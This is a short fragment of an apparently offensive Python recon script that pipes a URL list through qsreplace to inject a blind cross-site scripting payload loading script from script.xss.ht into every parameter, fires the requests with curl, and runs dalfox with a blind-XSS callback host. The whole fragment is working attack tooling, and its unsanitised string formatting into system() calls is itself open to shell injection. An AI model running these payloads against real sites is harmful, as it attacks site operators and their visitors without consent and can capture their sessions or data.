...
system('cat {}urls.txt | qsreplace \'"><script src="https://script.xss.ht"></script>\' | rush -j40 \'curl -sk "{}" -o /dev/null\' | tee -a {}xss.txt'.format(msg, msg, msg))
...
system('cat {}urls.txt | grep "=" | sed \'s/=.*/=/\' | sed \'s/URL: //\' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht | tee -a {}xss.txt'.format(msg, msg))
